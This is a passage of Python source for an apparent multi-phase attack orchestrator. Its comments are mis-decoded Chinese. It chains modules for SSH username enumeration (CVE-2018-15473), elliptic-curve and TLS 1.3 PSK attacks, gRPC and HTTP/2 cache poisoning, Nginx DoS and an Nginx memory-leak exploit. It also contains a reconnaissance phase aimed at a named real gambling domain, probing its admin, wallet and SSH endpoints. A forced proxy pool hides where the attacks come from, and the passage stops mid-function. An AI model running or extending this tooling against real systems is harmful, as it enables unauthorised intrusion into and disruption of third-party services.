# ========== æ–°å¢ï¼štime_mch å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_cve_2018_15473_enum(host: str, port: int, userlist: List[str], timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
    """CVE-2018-15473 SSHç”¨æˆ·æšä¸¾"""
    phase = "cve_2018_15473_enum"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        return await mod.cve_2018_15473_enum(host, port, userlist, timeout=timeout)
    
    return await run_with_timeout(_run(), timeout * len(userlist), phase)

async def phase_ssh_auth_timing(host: str, port: int, username: str, password: str, timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
    """SSHè®¤è¯æ—¶é—´æµ‹é‡"""
    phase = "ssh_auth_timing"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        return await mod.ssh_auth_timing(host, port, username, password, timeout=timeout)
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== æ–°å¢ï¼šp256_elliptic å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_p256_invalid_curve_attack(host: str, tls_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """P-256æ¤­åœ†æ›²çº¿éæ³•æ›²çº¿æ”»å‡»"""
    phase = "p256_invalid_curve"
    mod = safe_import('p256_elliptic')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        probe_factory = mod.ECProbeFactory()
        attacker = mod.InvalidCurveAttacker(host, probe_factory)
        results = await attacker.run_attack()
        
        return {
            "vulnerable": any(r.success for r in results),
            "results": [r.__dict__ for r in results],
            "risk_level": "HIGH" if any(r.success for r in results) else "LOW"
        }
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== æ–°å¢ï¼šwasm_runtime_analyzer å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_wasm_detect_runtime(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """æ£€æµ‹WASMè¿è¡Œæ—¶ç¯å¢ƒ"""
    phase = "wasm_detect_runtime"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer._detect_wasm_runtime()
    
    return await run_with_timeout(_run(), timeout, phase)

async def phase_wasm_timing_patterns(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """é€šè¿‡æ—¶åºæ¨¡å¼æ£€æµ‹WASMç¼–è¯‘ç¼“å­˜"""
    phase = "wasm_timing_patterns"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer._detect_via_timing_patterns()
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== æ–°å¢ï¼šxds_protocol_analyzer å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_xds_discover_services(host: str, xds_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """å‘ç°xDSæœåŠ¡å’Œç«¯ç‚¹"""
    phase = "xds_discover_services"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, xds_port, timeout=timeout)
        return await analyzer._discover_xds_services()
    
    return await run_with_timeout(_run(), timeout, phase)

async def phase_xds_test_grpc_connection(host: str, port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """æµ‹è¯•gRPC xDSè¿æ¥"""
    phase = "xds_test_grpc_connection"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, port, timeout=timeout)
        return await analyzer._test_grpc_xds_connection(port)
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== æ–°å¢ï¼šgrpc_trailer_poisoning å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_grpc_comprehensive_assessment(host: str, grpc_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """GRPCå…¨é¢å®‰å…¨è¯„ä¼°"""
    phase = "grpc_comprehensive_assessment"
    mod = safe_import('grpc_trailer_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.GrpcTrailerPoisoning(host, grpc_port, timeout=timeout)
        return await attacker.run_comprehensive_assessment()
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== æ–°å¢ï¼štls13_psk_crossbind å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_tls13_psk_full_attack(host: str, tls_port: int, timeout: float, sni_list: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
    """TLS 1.3 PSKè·¨ç»‘å®šå®Œæ•´æ”»å‡»"""
    phase = "tls13_psk_full_attack"
    mod = safe_import('tls13_psk_crossbind')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.TLS13PSKCrossBind(host, tls_port, timeout=timeout)
        snis = sni_list or [host]
        return await attacker.run_psk_crossbind_attack(snis)
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== æ–°å¢ï¼šec_aoe å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_ec_aoe_full_attack(host: str, tls_port: int, timeout: float, protocols: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
    """æ¤­åœ†æ›²çº¿AOEå®Œæ•´æ”»å‡»"""
    phase = "ec_aoe_full_attack"
    mod = safe_import('ec_aoe')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        return await attacker.run_comprehensive_attack(protos)
    
    return await run_with_timeout(_run(), timeout * 3, phase)  # ECæ”»å‡»éœ€è¦æ›´å¤šæ—¶é—´

async def phase_go88_recon(host: str, timeout: float) -> PhaseResult:
    """Go88.com targeted reconnaissance"""
    phase = "go88_recon"
    mod = safe_import('go88_recon')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        print("\n[GO88] Starting go88.com reconnaissance module...")
        print(f"[GO88] Target: go88.com -> {host}")
        
        recon = mod.Go88Recon()
        
        print("[GO88] Phase 1: DNS enumeration...")
        # DNS æšä¸¾
        await recon._dns_enumeration()
        
        print("[GO88] Phase 2: Subdomain enumeration...")
        # å­åŸŸåæšä¸¾ï¼ˆé™åˆ¶æ•°é‡é¿å…è¶…æ—¶ï¼‰
        subdomains_to_test = ['www', 'api', 'admin', 'game', 'wallet', 'agent', 'backend', 'dev', 'test']
        for subdomain in subdomains_to_test:
            await recon._resolve_subdomain(f"{subdomain}.{recon.target_domain}")
        
        print("[GO88] Phase 3: SSH access testing...")
        await recon._test_ssh_access()
        
        print(f"[GO88] Reconnaissance complete: {len(recon.discovered_ips)} IPs, {len(recon.discovered_subdomains)} subdomains")
        
        # è¿”å›ç»“æœ
        return {
            'discovered_ips': list(recon.discovered_ips),
            'discovered_subdomains': list(recon.discovered_subdomains),
            'primary_target': recon.target_ip,
            'domain': recon.target_domain,
            'risk_level': 'HIGH' if len(recon.discovered_ips) > 1 else 'MEDIUM'
        }

    return await run_with_timeout(_run(), timeout, phase)


# -------- Orchestrator --------

class IntegratedOrchestrator:
    def __init__(self,
                 host: str,
                 ip: Optional[str] = None,
                 tls_port: int = 443,
                 http_port: int = 80,
                 grpc_port: int = 443,
                 xds_port: int = 15000,
                 ssh_port: int = 22000,
                 timeout: float = 10.0,
                 posture: str = 'intelligent',
                 sni_list: Optional[List[str]] = None,
                 ec_protocols: Optional[List[str]] = None,
                 enable_phases: Optional[List[str]] = None,
                 jsonl_file: Optional[str] = None,
                 log_file: Optional[str] = None,
                 proxy_url: Optional[str] = None,
                 force_proxy: bool = True,
                 proxy_pool: Optional[List[str]] = None):
        
        # ç®€å•çš„é…ç½®éªŒè¯ - å¿«é€Ÿå¤±è´¥
        self._validate_basic_config(host, tls_port, http_port, timeout)
        
        # åˆå§‹åŒ–ä»£ç†æ± 
        if proxy_pool:
            init_proxy_pool(proxy_pool)
            logger.info(f"Initialized proxy pool with {len(proxy_pool)} proxies")
        elif proxy_url:
            # å¦‚æœåªæœ‰å•ä¸ªä»£ç†ï¼Œä¹Ÿåˆ›å»ºä¸€ä¸ªæ± 
            init_proxy_pool([proxy_url])
            logger.info(f"Initialized proxy pool with single proxy")
        self.host = host
        self.ip = ip
        # ä½¿ç”¨IPåœ°å€è¿›è¡Œè¿æ¥ï¼Œä½†ä¿ç•™hostnameç”¨äºSNI/Host header
        self.connect_host = ip or host
        self.tls_port = tls_port
        self.http_port = http_port
        self.grpc_port = grpc_port
        self.xds_port = xds_port
        self.ssh_port = ssh_port
        self.timeout = timeout
        self.posture = posture
        self.sni_list = sni_list
        self.ec_protocols = ec_protocols
        self.proxy_url = proxy_url
        self.force_proxy = force_proxy
        self.enable_phases = set(enable_phases or [
            # åŸºç¡€ä¾¦å¯Ÿ
            'smart_detection', 'fingerprint',
            # è¯ä¹¦å’ŒOCSP
            'certificate_attacks', 'ocsp_validation',
            # HTTP/2å’ŒgRPC
            'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning',
            # xDSå’ŒWASM
            'xds_analysis', 'wasm_runtime',
            # TLSå’Œæ¤­åœ†æ›²çº¿
            'tls13_psk_crossbind', 'elliptic_curve_aoe',
            # Nginx
            'nginx_dos_sandwich', 'nginx_config_traps',
            # SSH
            'time_mch_first_door',
            # åè®®è§„èŒƒåŒ–å·®å¼‚
            'proto_norm_diff', 'proto_norm_v2_analyze',
            # å…¶ä»–
            'cve_2017_7529', 'go88_recon'
        ])
        self.jsonl_file = jsonl_file
        self.logger = self._setup_logger(log_file)
        
        # ç®€å•æƒ…æŠ¥ç®¡ç†å™¨
        self.intel = SimpleIntel()

        # äº‹ä»¶ä¸ç­–ç•¥å¼•æ“ï¼ˆè½»é‡å®ç°ï¼‰
        self._events: List[Dict[str, Any]] = []
        self._task_queue: List[Dict[str, Any]] = []
        
        # å¹¶è¡Œæ‰§è¡Œç»„è§„åˆ’
        self.parallel_groups = self._plan_parallel_groups()
        
        # åˆå§‹åŒ–ç»Ÿä¸€ä»£ç†ç®¡ç†å™¨
        if UNIFIED_PROXY_AVAILABLE and self.proxy_url:
            self.proxy_manager = init_global_proxy(self.proxy_url)
            self.logger.info(f"Initialized unified proxy manager: {self.proxy_manager}")
        else:
            self.proxy_manager = None

    # äº‹ä»¶æ³¨å…¥å›è°ƒï¼Œä¾›å­æ¨¡å—è°ƒç”¨
    def event_callback(self, name: str, payload: Dict[str, Any]):
        evt = {'name': name, 'payload': payload, 'time': _now_iso()}
        self._events.append(evt)
        self._emit_jsonl({'event': 'module_event', **evt})
        self.logger.info(f"event {name}: {payload}")

    # ç®€å•ç­–ç•¥å¼•æ“ï¼šæ ¹æ®äº‹ä»¶æ·»åŠ ä»»åŠ¡
    def _process_events_and_schedule(self):
        for evt in self._events:
            n = evt.get('name')
            p = evt.get('payload', {})
            if n == 'HighValueTargetDiscovered' and p.get('type') == 'Cluster':
                # è°ƒåº¦ gRPC æ”»å‡»æ¨¡å—
                self._task_queue.append({'phase': 'grpc_trailer_poisoning'})
            
            # Universal Integration Mode - åœ¨å¾ªç¯å†…å¤„ç†æ¯ä¸ªäº‹ä»¶
            if UNIVERSAL_INTEGRATOR_AVAILABLE:
                if n == 'WasmPluginDiscovered':
                    # è°ƒåº¦ Wasm æ·±åº¦åˆ†æ
                    self._task_queue.append({'phase': 'wasm_runtime', 'posture': 'deep'})
                if n == 'ConfigInjectionPoint':
                    # è°ƒåº¦é«˜çº§æ³¨å…¥æ”»å‡»
                    self.logger.info(f"ConfigInjection discovered at {p.get('endpoint')} - escalating attacks")
                if n == 'WeakTLSConfig':
                    # è°ƒåº¦TLSé™çº§æ”»å‡»
                    self.logger.info(f"WeakTLS discovered: {p.get('details')} - potential downgrade attack")
        
        # Universal Integration Mode - é»˜è®¤æ€»æ˜¯æ·»åŠ 
        if UNIVERSAL_INTEGRATOR_AVAILABLE:
            self._task_queue.append({'phase': 'universal_integration'})
            
        # æ¸…ç©ºå·²å¤„ç†äº‹ä»¶
        self._events = []

    async def _run_dynamic_tasks(self, results_store: Dict[str, Any]):
        while self._task_queue:
            task = self._task_queue.pop(0)
            phase = task.get('phase')
            
            if phase == 'grpc_trailer_poisoning' and 'grpc_trailer_poisoning' in self.enable_phases:
                res = await self._run_phase_with_events(phase_grpc, 'grpc_trailer_poisoning', self.host, self.grpc_port, self.timeout, proxy_url=self.proxy_url)
                results_store['phases'][res.name] = self._pack(res)
            
            #  Universal Integration - Zero-Loss Method Execution
            elif phase == 'universal_integration' and UNIVERSAL_INTEGRATOR_AVAILABLE:
                res = await self._run_phase_with_events(phase_universal_integration, 'universal_integration', self.host, self.tls_port, self.timeout)
                results_store['phases'][res.name] = self._pack(res)
            elif phase == 'wasm_runtime' and 'wasm_runtime' in self.enable_phases:
                res = await self._run_phase_with_events(phase_wasm, 'wasm_runtime', self.host, self.http_port, self.timeout, posture=task.get('posture','intelligent'))
                results_store['phases'][res.name] = self._pack(res)
            elif phase == 'go88_recon' and 'go88_recon' in self.enable_phases:
                print("[DYNAMIC] [*] Executing go88_recon module...")
                self.logger.info("[DYNAMIC] Starting go88_recon via dynamic scheduling")
                res = await self._run_phase_with_events(phase_go88_recon, 'go88_recon', self.host, self.timeout)
                results_store['phases'][res.name] = self._pack(res)
                print(f"[DYNAMIC] [+] go88_recon completed: {res.success}")
                self.logger.info("[+] go88_recon completed via dynamic scheduling")
            # å¯æ‰©å±•æ›´å¤šè§„åˆ™

    def _setup_logger(self, log_file: Optional[str]) -> logging.Logger:
        logger = logging.getLogger('integrated_orchestrator')
        if not logger.handlers:
            logger.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s %(levelname)s orchestrator - %(message)s')
            handler: logging.Handler
            if log_file:
                Path(log_file).parent.mkdir(parents=True, exist_ok=True)
                handler = logging.FileHandler(log_file, encoding='utf-8')
            else:
                handler = logging.StreamHandler(sys.stdout)
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def _validate_basic_config(self, host: str, tls_port: int, http_port: int, timeout: float):
        """ç®€å•é…ç½®éªŒè¯ - å¿«é€Ÿå¤±è´¥"""
        errors = []
        if not host or not isinstance(host, str):
            errors.append("invalid host")
        if not (1 <= tls_port <= 65535):
            errors.append(f"invalid tls_port: {tls_port}")
        if not (1 <= http_port <= 65535):
            errors.append(f"invalid http_port: {http_port}")
        if timeout <= 0:
            errors.append("timeout must be positive")
        if errors:
            raise ValueError(f"Config errors: {'; '.join(errors)}")

    def _plan_parallel_groups(self) -> Dict[str, List[str]]:
        """ç®€å•çš„å¹¶è¡Œç»„è§„åˆ’ - å¢å¼ºç‰ˆ"""
        return {
            'foundation': ['smart_detection'],
            'fingerprint': ['fingerprint'], 
            'independent': [
                'certificate_attacks', 'ocsp_validation', 'xds_analysis', 'wasm_runtime', 
                'proto_norm_diff', 'proto_norm_v2_analyze', 'nginx_config_traps',
                'wasm_detect_runtime', 'wasm_timing_patterns', 'xds_discover_services'
            ],
            'protocol': [
                'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning', 
                'tls13_psk_crossbind', 'grpc_comprehensive_assessment', 'tls13_psk_full_attack'
            ],
            'elliptic': ['elliptic_curve_aoe', 'ec_aoe_full_attack', 'p256_invalid_curve'],
            'ssh': ['time_mch_first_door', 'cve_2018_15473_enum', 'ssh_auth_timing'],
            'export': ['proto_norm_export_evidence']
        }

    def _emit_jsonl(self, event: Dict[str, Any]) -> None:
        if not self.jsonl_file:
            return
        try:
            Path(self.jsonl_file).parent.mkdir(parents=True, exist_ok=True)
            line = json.dumps(event, ensure_ascii=False, default=str)
            with open(self.jsonl_file, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except Exception as e:
            # As a sink failure should not crash the run, log and continue
            try:
                self.logger.debug(f"jsonl write failed: {e}")
            except Exception:
                pass

    async def _run_phase_with_events(self, phase_coro_fn, phase_name: str, *args, **kwargs) -> PhaseResult:
        start_ts = _now_iso()
        self._emit_jsonl({
            'timestamp': start_ts,
            'event': 'phase_start',
            'phase': phase_name,
            'host': self.host,
        })
        self.logger.info(f"phase_start {phase_name}")
        pr: PhaseResult
        try:
            pr = await phase_coro_fn(*args, **kwargs)
        except Exception as e:
            pr = PhaseResult(name=phase_name, success=False, data={}, error=f"{type(e).__name__}: {e}")
        end_ts = _now_iso()
        event = {
            'timestamp': end_ts,
            'event': 'phase_end',
            'phase': phase_name,
            'host': self.host,
            'success': pr.success,
            'duration_ms': pr.duration_ms,
        }
        if pr.error:
            event['error'] = pr.error
            self._emit_jsonl({
                'timestamp': end_ts,
                'event': 'phase_error',
                'phase': phase_name,
                'host': self.host,
                'error': pr.error,
            })
            self.logger.warning(f"phase_error {phase_name}: {pr.error}")
        self._emit_jsonl(event)
        self.logger.info(f"phase_end {phase_name} success={pr.success} dur={pr.duration_ms}ms")
        return pr

    async def run(self) -> Dict[str, Any]:
        results: Dict[str, Any] = {
            'target': {
                'host': self.host,
                'tls_port': self.tls_port,
                'http_port': self.http_port,
                'ssh_port': self.ssh_port,
                'grpc_port': self.grpc_port
            },
            'timestamp': _now_iso(),
            'phases': {},
            'errors': {},
            'metadata': {
                'timeout': self.timeout,
                'posture': self.posture,
            }
        }

        self._emit_jsonl({
            'timestamp': results['timestamp'],
            'event': 'orchestrator_start',
            'host': self.host,
            'config': {
                'tls_port': self.tls_port,
                'http_port': self.http_port,
                'grpc_port': self.grpc_port,
                'xds_port': self.xds_port,
                'ssh_port': self.ssh_port,
                'timeout': self.timeout,
                'posture': self.posture,
                'phases': sorted(list(self.enable_phases)),
            }
        })
        self.logger.info(f"orchestrator_start host={self.host}")

        # === é˜¶æ®µ0: ä»£ç†è‡ªæ£€ (Proxy Validation) ===
        # å¼ºåˆ¶IPæ± æ£€æŸ¥ï¼šå¿…é¡»ç¡®ä¿ä»£ç†å·¥ä½œæ­£å¸¸ï¼Œå¦åˆ™æ•´ä¸ªæ”»å‡»é“¾å¤±æ•ˆ
        if self.force_proxy:
            if not self.proxy_url:
                self.logger.error("CRITICAL: force_proxy=True but no proxy_url provided")
                print("[!] CRITICAL: å¼ºåˆ¶ä»£ç†æ¨¡å¼ä½†æœªæä¾›ä»£ç†URL")
                results['proxy_check'] = {'success': False, 'error': 'No proxy URL provided in force_proxy mode'}
                results['summary'] = {'overall_risk': 'ABORTED', 'reason': 'No proxy URL in force_proxy mode'}
                return results
            
            self.logger.info("Starting Phase 0: Critical Proxy Validation (FORCED)")
            print("[!] å¼ºåˆ¶ä»£ç†æ¨¡å¼ï¼šå¼€å§‹å…³é”®ä»£ç†éªŒè¯...")
            proxy_check = await self._critical_proxy_check()
            if not proxy_check['success']:
                self.logger.error(f"CRITICAL: Proxy check failed - {proxy_check['error']}")
                print(f"[!] CRITICAL: ä»£ç†æ£€æŸ¥å¤±è´¥ - {proxy_check['error']}")
                results['proxy_check'] = proxy_check
                results['summary'] = {'overall_risk': 'ABORTED', 'reason': 'Proxy validation failed'}
                return results
            else:
                self.logger.info(f"Proxy validated: {proxy_check['current_ip']} ({proxy_check['geo_location']})")
                print(f"[+] ä»£ç†éªŒè¯æˆåŠŸ: {proxy_check['current_ip']} ({proxy_check['geo_location']})")
                results['proxy_check'] = proxy_check
        elif self.proxy_url:
            # éå¼ºåˆ¶æ¨¡å¼ï¼Œä½†æœ‰proxy_urlå°±æ£€æŸ¥
            self.logger.info("Starting Phase 0: Critical Proxy Validation")
            proxy_check = await self._critical_proxy_check()
            if not proxy_check['success']:
                self.logger.warning(f"Proxy check failed - {proxy_check['error']}")
                print(f"[!] WARNING: ä»£ç†æ£€æŸ¥å¤±è´¥ä½†ç»§ç»­æ‰§è¡Œ - {proxy_check['error']}")
            results['proxy_check'] = proxy_check

        # === é˜¶æ®µ1: å¿«é€Ÿä¾¦å¯Ÿ (Rapid Reconnaissance) ===
        # ç›®æ ‡ï¼šåœ¨15-20ç§’å†…å®Œæˆï¼Œè·å–å†³ç­–æ‰€éœ€çš„æ ¸å¿ƒæƒ…æŠ¥
        self.logger.info("Starting Phase 1: Rapid Reconnaissance")
        
        # è¿è¡Œ smart_detector è·å–åŸºç¡€ä¿¡æ¯
        smart_detect_ctx: Dict[str, Any] = {}
        if 'smart_detection' in self.enable_phases:
            sd_res = await self._run_phase_with_events(
                phase_smart_detect, 'smart_detection', self.host, 
                [22000, self.http_port, self.tls_port, 2222, self.grpc_port, self.xds_port, 8000, 3389]
            )
            results['phases'][sd_res.name] = self._pack(sd_res)
            if sd_res.success:
                smart_detect_ctx = sd_res.data
            else:
                results['errors'][sd_res.name] = sd_res.error

        # è¿è¡Œ fingerprint è·å–è¯¦ç»†æœåŠ¡å™¨ä¿¡æ¯
        fingerprint_ctx: Dict[str, Any] = {}
        fingerprint_res = PhaseResult(name='fingerprint', success=False, data={})
        if 'fingerprint' in self.enable_phases:
            fingerprint_res = await self._run_phase_with_events(
                phase_fingerprint, 'fingerprint', self.host, self.tls_port, self.http_port, self.timeout, smart_detect_ctx, self.proxy_url, self.ssh_port
            )
            results['phases'][fingerprint_res.name] = self._pack(fingerprint_res)
            if fingerprint_res.success:
                fingerprint_ctx = fingerprint_res.data
                # ç®€å•æƒ…æŠ¥æ”¶é›†
                self.intel.set('fingerprint', fingerprint_res.data)
                self.logger.info(f"Collected fingerprint intel: {self.intel.get_server_type()}")
            else:
                results['errors'][fingerprint_res.name] = fingerprint_res.error

        # *** å…³é”®ï¼šé›†æˆ proto_norm_diff.survey_topology ***
        proto_norm_res = PhaseResult(name='proto_norm_diff_survey', success=False, data={})
        if 'proto_norm_diff' in self.enable_phases:
            proto_norm_res = await self._run_phase_with_events(
                phase_proto_norm_diff, 'proto_norm_diff_survey', self.host, self.tls_port, self.timeout, survey_only=True, proxy_url=self.proxy_url
            )
            results['phases'][proto_norm_res.name] = self._pack(proto_norm_res)
            if not proto_norm_res.success:
                results['errors'][proto_norm_res.name] = proto_norm_res.error

        # === é˜¶æ®µ2: æ™ºèƒ½å†³ç­– (Intelligent Decision-Making) ===
        # ç›®æ ‡ï¼šåŸºäºä¾¦å¯Ÿæƒ…æŠ¥ï¼Œæ„å»ºä¸‹ä¸€æ­¥çš„æ”»å‡»è®¡åˆ’
        self.logger.info("Starting Phase 2: Intelligent Decision-Making")
        
        # ä»ä¾¦å¯Ÿç»“æœä¸­æå–æƒ…æŠ¥
        intel = self._extract_intelligence(fingerprint_res, proto_norm_res)
        self.logger.info(f"Intelligence gathered: Server='{intel.get('server_type', 'N/A')}', H2_Supported={intel.get('h2_supported', 'N/A')}, H3_Advertised={intel.get('h3_advertised', 'N/A')}")
        
        # æ·»åŠ åˆ°å®ä¾‹å˜é‡ï¼Œä¾›åç»­ä½¿ç”¨
        self.intel.data['extracted'] = intel

        # åŠ¨æ€æ„å»ºä¸‹ä¸€é˜¶æ®µçš„ä»»åŠ¡åˆ—è¡¨
        # å¦‚æœç”¨æˆ·æ˜ç¡®æŒ‡å®šäº†phasesï¼Œå¼ºåˆ¶æ‰§è¡Œï¼Œå¦åˆ™ä½¿ç”¨æ™ºèƒ½å†³ç­–
        if len(self.enable_phases) < 16:  # ç”¨æˆ·æŒ‡å®šäº†ç‰¹å®šphasesï¼ˆé»˜è®¤æ˜¯16ä¸ªï¼‰
            next_phases = list(self.enable_phases)
            self.logger.info(f"USER SPECIFIED phases: {next_phases} (bypassing intelligent decision)")
        else:
            next_phases = self._plan_next_phases(intel)
            self.logger.info(f"Planning next execution wave with {len(next_phases)} targeted phases: {next_phases}")

        # === é˜¶æ®µ3: ç²¾ç¡®æ‰“å‡» (Targeted Attack Execution) ===
        self.logger.info("Starting Phase 3: Targeted Attack Execution")
        
        parallel_tasks: List[asyncio.Task] = []
        cert_ctx: Dict[str, Any] = {}

        # æ ¹æ®å†³ç­–ç»“æœåŠ¨æ€æ„å»ºä»»åŠ¡
        if 'certificate_attacks' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_cert_rebel, 'certificate_attacks', self.host, self.tls_port, self.timeout, fingerprint_ctx, self.proxy_url, self.ip)
            ))
        if 'ocsp_validation' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_ocsp, 'ocsp_validation', self.host, self.tls_port, self.timeout)
            ))
        if 'xds_analysis' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_xds, 'xds_analysis', self.host, self.xds_port, self.timeout, event_cb=self.event_callback)
            ))
        if 'wasm_runtime' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_wasm, 'wasm_runtime', self.host, self.http_port, self.timeout, posture=self.posture)
            ))
        if 'nginx_dos_sandwich' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_nginx_dos, 'nginx_dos_sandwich', self.host, self.http_port, self.timeout)
            ))
        if 'nginx_config_traps' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_nginx_config_traps, 'nginx_config_traps', self.host, self.http_port, self.timeout, self.proxy_url)
            ))
        if 'elliptic_curve_aoe' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_ec_aoe, 'elliptic_curve_aoe', self.host, self.tls_port, self.timeout, self.ec_protocols, self.proxy_url)
            ))
        if 'p256_invalid_curve' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_p256_invalid_curve_attack, 'p256_invalid_curve', self.host, self.tls_port, self.timeout, self.proxy_url)
            ))
        if 'time_mch_first_door' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_time_mch_first_door, 'time_mch_first_door', self.host, self.ssh_port, self.timeout)
            ))
        if 'proto_norm_diff' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_proto_norm_diff, 'proto_norm_diff', self.host, self.tls_port, self.timeout, survey_only=False, proxy_url=self.proxy_url)
            ))
        if 'proto_norm_v2_analyze' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_proto_norm_v2_analyze, 'proto_norm_v2_analyze', self.host, self.tls_port, self.timeout, None)
            ))
        if 'wasm_detect_runtime' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_wasm_detect_runtime, 'wasm_detect_runtime', self.host, self.http_port, self.timeout, self.proxy_url)
            ))
        if 'xds_discover_services' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_xds_discover_services, 'xds_discover_services', self.host, self.xds_port, self.timeout, self.proxy_url)
            ))

        # HTTP/2ç›¸å…³æ”»å‡»æ¨¡å—
        if 'h2_continuation' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_h2_continuation, 'h2_continuation', self.host, self.tls_port, self.timeout, fingerprint_ctx, cert_ctx, proxy_url=self.proxy_url)
            ))
        if 'h2_cache_poisoning' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_h2_cache_poison, 'h2_cache_poisoning', self.host, self.tls_port, self.timeout, proxy_url=self.proxy_url)
            ))
        if 'grpc_trailer_poisoning' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_grpc, 'grpc_trailer_poisoning', self.host, self.grpc_port, self.timeout, proxy_url=self.proxy_url)
            ))
        if 'tls13_psk_crossbind' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_tls13_psk, 'tls13_psk_crossbind', self.host, self.tls_port, self.timeout, self.sni_list, proxy_url=self.proxy_url)
            ))
        
        # æ–°å¢ï¼šCVE-2017-7529 Nginx å†…å­˜æ³„éœ²æ”»å‡»
        if 'cve_2017_7529' in next_phases:
